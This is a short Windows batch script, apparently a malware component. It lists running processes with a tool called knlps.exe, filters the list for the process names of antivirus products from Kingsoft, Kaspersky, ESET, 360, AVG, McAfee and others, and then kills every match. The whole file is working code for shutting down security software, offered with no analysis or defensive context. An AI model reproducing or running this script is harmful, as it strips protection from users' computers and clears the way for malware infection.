@ECHO OFF
@knlps.exe -l >pid.txt
@FINDSTR /i "kwatch.exe" PID.txt >>RAV.txt
@FINDSTR /i "kavstart.exe" PID.txt >>RAV.txt
@FINDSTR /i "kav32.exe" PID.txt >>RAV.txt
@FINDSTR /i "egui.exe" PID.txt >>RAV.txt
@FINDSTR /i "ekrn.exe" PID.txt >>RAV.txt
@FINDSTR /i "360Tray.exe" PID.txt >>RAV.txt
@FINDSTR /i "guid.exe" PID.txt >>RAV.txt
@FINDSTR /i "avg.exe" PID.txt >>RAV.txt
@FINDSTR /i "AST.exe" PID.txt >>RAV.txt
@FINDSTR /i "Mcshield.exe" PID.txt >>RAV.txt
@FOR /F "eol=; tokens=1 delims= " %%1 in (RAV.txt) do knlps.exe -k %%1
